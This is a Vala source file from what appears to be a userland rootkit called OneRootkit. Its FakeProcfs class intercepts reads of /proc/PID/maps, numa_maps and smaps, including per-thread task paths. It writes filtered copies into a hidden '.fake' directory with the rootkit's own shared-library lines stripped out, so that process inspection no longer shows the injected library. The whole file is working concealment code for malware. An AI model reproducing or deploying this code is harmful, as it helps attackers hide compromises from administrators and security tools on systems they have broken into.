using Posix;

[Compact]
class FakeProcfs
{

	// TODO: Make the memory look more contiguous or something
	// TODO: Check if we need to remove libdl from the mapsim str

	public static string TamperOpenPath(string file)
	{
		string realFile = realpath(file);

		if(Strings.starts_with(realFile, "/proc/"))
		{
			string[] splitPath = Strings.split(realFile, "/");
			string pid = splitPath[1];
			//printf("File: %s\n", file);
			//printf("Split Length: %d\n", splitPath.length);

			if(splitPath.length == 3)
			{
				// /proc/PID/maps
				string entry1 = splitPath[2];

				if(Strings.equal(entry1, "maps") || Strings.equal(entry1, "numa_maps"))
				{
					return GenerateFakeMaps(pid, realFile);
				}
				else if(Strings.equal(entry1, "smaps"))
				{
					return GenerateFakeSmaps(pid, realFile);
				}
			}
			else if(splitPath.length == 5)
			{
				// /proc/PID/task/TID/maps
				// TODO: this doesnt work properly with grep

				string entry1 = splitPath[2];
				string entry2 = splitPath[4];

				if(Strings.equal(entry1, "task") && (Strings.equal(entry2, "maps") || Strings.equal(entry2, "numa_maps")))
				{
					return GenerateFakeMaps(pid, realFile);
				}
				else if(Strings.equal(entry1, "task") && Strings.equal(entry2, "smaps"))
				{
					return GenerateFakeSmaps(pid, realFile);
				}
			}
		}

		return file;
	}

	public static string GenerateFakeSmaps(string pid, string file)
	{
		unowned FILE original;
		unowned FILE fake;
		char[] buffer = new char[PATH_MAX];

		FopenMethod oldFopen = (FopenMethod) DLHandles.LIBC().GetMethod("fopen");
		FcloseMethod oldFclose = (FcloseMethod) DLHandles.LIBC().GetMethod("fclose");
		string fakePath = OneRootkit.GetRootkitHomeDir() + "/.fake/smaps." + pid;

		original = oldFopen(file, "r");
		fake = oldFopen(fakePath, "w");
		bool skipLines = false;

		while(original.gets(buffer) != null)
		{
			if(skipLines)
			{
				if(strstr((string) buffer, "-") == null)
				{
					continue;
				}
				else
				{
					skipLines = false;
				}
			}

			if(strstr((string)buffer, OneRootkit.GetRootkitSoPath()) == null)
			{
				fake.puts((string)buffer);
			}
			else
			{
				skipLines = true;
			}
		}

		oldFclose(original);
		oldFclose(fake);
		return fakePath;
	}

	public static string GenerateFakeMaps(string pid, string file)
	{
		unowned FILE original;
		unowned FILE fake;
		char[] buffer = new char[PATH_MAX];

		FopenMethod oldFopen = (FopenMethod) DLHandles.LIBC().GetMethod("fopen");
		FcloseMethod oldFclose = (FcloseMethod) DLHandles.LIBC().GetMethod("fclose");
		string fakePath = OneRootkit.GetRootkitHomeDir() + "/.fake/maps." + pid;

		original = oldFopen(file, "r");
		fake = oldFopen(fakePath, "w");

		while(original.gets(buffer) != null)
		{
			if(strstr((string)buffer, OneRootkit.GetRootkitSoPath()) == null)
			{
				fake.puts((string)buffer);
			}
		}

		oldFclose(original);
		oldFclose(fake);
		return fakePath;
	}
}